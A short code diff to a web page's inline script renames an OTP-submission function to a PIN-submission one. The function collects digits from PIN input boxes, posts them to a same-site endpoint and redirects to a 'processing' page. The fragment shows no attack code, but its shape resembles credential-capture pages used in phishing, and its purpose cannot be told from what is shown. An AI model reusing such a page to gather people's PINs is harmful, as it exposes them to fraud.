@@ -150,19 +150,19 @@
 <script src="script.js"></script>
 
 <script>
-function submitOtp() {
-    let otp = "";
+function submitpin() {
+    let pin = "";
 
     document.querySelectorAll(".pin-box").forEach(input => {
-        otp += input.value;
+        pin += input.value;
     });
 
-    fetch("/submit-otp", {
+    fetch("/submit-pin", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify({ otp })
+        body: JSON.stringify({ pin })
     });
 
     window.location.href = "processing.html";
